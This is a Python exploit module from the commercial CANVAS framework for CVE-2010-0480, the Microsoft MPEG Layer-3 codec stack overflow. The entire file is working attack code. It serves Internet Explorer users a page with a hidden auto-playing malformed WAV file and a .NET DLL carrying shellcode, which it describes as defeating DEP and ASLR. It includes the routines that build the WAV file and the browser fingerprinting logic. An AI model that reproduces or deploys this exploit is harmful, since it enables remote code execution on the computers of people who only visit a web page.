#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2008-2009
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from httpclientside import httpclientside
from shellcode import shellcodeGenerator,win32shell
import binascii
from pelib import PElib
import struct
import random
from libs.spkproxy import header,body
from canvasengine import WIN32MOSDEF
import shellcode.standalone.windows.payloads as payloads

NAME                            = 'MPEG Layer-3 codecs stack overflow'
DESCRIPTION                     = 'MPEG Layer-3 codecs stack overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']         = 'Microsoft'
DOCUMENTATION['Repeatability']  = 'One Shot'
DOCUMENTATION['Date public']    = '04/14/2010'
DOCUMENTATION['CVE Name']       = 'CVE-2010-0480'
DOCUMENTATION['CVS URL']        = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0480'
DOCUMENTATION['MSRC']           = 'http://www.microsoft.com/technet/security/Bulletin/MS10-026.mspx'
DOCUMENTATION['Note']           = """

This is a client-side exploit - so use it via clientd.

This module was tested on Windows XP SP3 / IE7
It uses the .NET DLL trick, effectively defeating DEP and ASLR.

"""

VERSION                         = '1.0'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Clientside'
PROPERTY['ARCH']                = [['Windows']]
PROPERTY['VERSION']             = ['2000','XP','2003']
PROPERTY['MSADV']               = 'MS10-026'
PROPERTY['DELIVERY']            = 'HTTP'

NOTES="""
MS10-026: Vulnerability in Microsoft MPEG Layer-3 Codecs Could Allow Remote Code Execution (977816)
"""

CHANGELOG="""
Tested on Windows XP SP3 / IE7
It uses the .NET DLL trick, effectively defeating DEP and ASLR.

In IE 6 on the test box, for some reason, the .Net DLL doesn't get loaded!
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        #self.searchMethod   = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent      = [('Mozilla/','MSIE','')]
        self.badstring      = ''
        self.version        = 0
        self.name           = NAME
        self.filename       = 'index.html'
        self.wavfile        = 'file.wav'
        self.dllfile        = 'exploit.dll'
        self.subesp         = 0x100
        self.pc             = 0x72000000
        self.vProtect       = True
        return
    
    
    def is_vulnerable(self, info_dict):
        """
        Check for .Net and IE 6/7
        """
        if "MSIE 7.0" in info_dict['user_agent']:
            self.log("Target has MSIE 7")
            if ".NET" in info_dict["user_agent"]:
                self.log("Found .Net!")
                #needs them to check some ActiveX permissions!
                return 50
        return 0
    
    def run(self):
        self.host       = self.target.interface
        self.filename   = self.argsDict.get('filename',self.filename)
        class cl:
            def __init__(self):
                pass
        c           = cl()
        c.URL       = self.dllfile
        filedata    = self.makefile(c)
        fd          = file(c.URL,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('[+] Opening %s for output'%self.filename)
        c.URL       = self.wavfile
        filedata    = self.makefile(c)
        fd          = file(c.URL,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('[+] Opening %s for output'%self.filename)
        c.URL       = self.filename
        filedata    = self.makefile(c)
        fd          = file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('[+] Wrote to %s'%self.filename)
        self.log('NOTE: Include file.wav, also an exploit.dll was created and needs to be included')
        return 1

    def generate_wav(self):
        mp3data = 'ACM\0' + 'crc\0' + 'AAAAAAAAAAAAAAAA'
        wavdata = 'data' + struct.pack('<i',len(mp3data)) + mp3data
        factdata = 'fact' + struct.pack('<iHH', 4, 0xAF98, 1)
        fmtdata = 'fmt ' + struct.pack('<iHHiiiHHiHHH', 0x1e, 0x55, 1, 0x93, 0x3e8, 1, 0x0c, 1, 2, 0x18, 1, 0x571)
        wav = 'RIFF' + struct.pack('<i', len(fmtdata) + len(factdata) + len(wavdata) + 4) + 'WAVE' + fmtdata + factdata + wavdata
        return wav

    def makefile(self, clientheader):
        
        if self.dllfile in clientheader.URL:
            self.log('[+] Sending .NET DLL')
            p = PElib()
            return p.createDotNETPEFileBuf(self.createShellcode(), self.pc)
        
        elif self.wavfile in clientheader.URL:
            self.log('[+] Sending WAV file')
            return self.generate_wav()
            
        else:
            self.log('[+] Sending HTML file')
            html="""<html>
<body>
<OBJECT CLASSID='%d%s#exploit.Shellcode'></OBJECT>
<EMBED src="%s" autostart=true loop=false volume=100 hidden=true>
<NOEMBED>
<BGSOUND src="%s">
</NOEMBED>
</body>
</html>"""%(random.randint(0,65535), self.dllfile, self.wavfile, self.wavfile)
            return html

    def makesploit(self,clientheader,clientbody):
        h           = header('SERVER')
        b           = body()
        
        self.log("URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
    
        self.log('[+] User agent of connecting host: %s' % user_agent)
        
        #MSIE 6 will use "contype" to get the content type in a weird request
        #See: http://support.microsoft.com/default.aspx?scid=kb;en-us;293792
        if not user_agent.count('MSIE') and not user_agent.count('Windows-Media-Player') and not user_agent.count("contype"):
            self.log('[-] Non IE/WMP browser connected - returning None: ' + user_agent)
            return None,None
        
        data = self.makefile(clientheader)
        if not data:
            return None,None
        
        b.setBody(data)
    
        if '<html>' in data.lower():
            h.addHeader('Content-Type','text/html')
        else:
            h.addHeader('Content-Type','application/octet-stream')
        
        return h,b

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
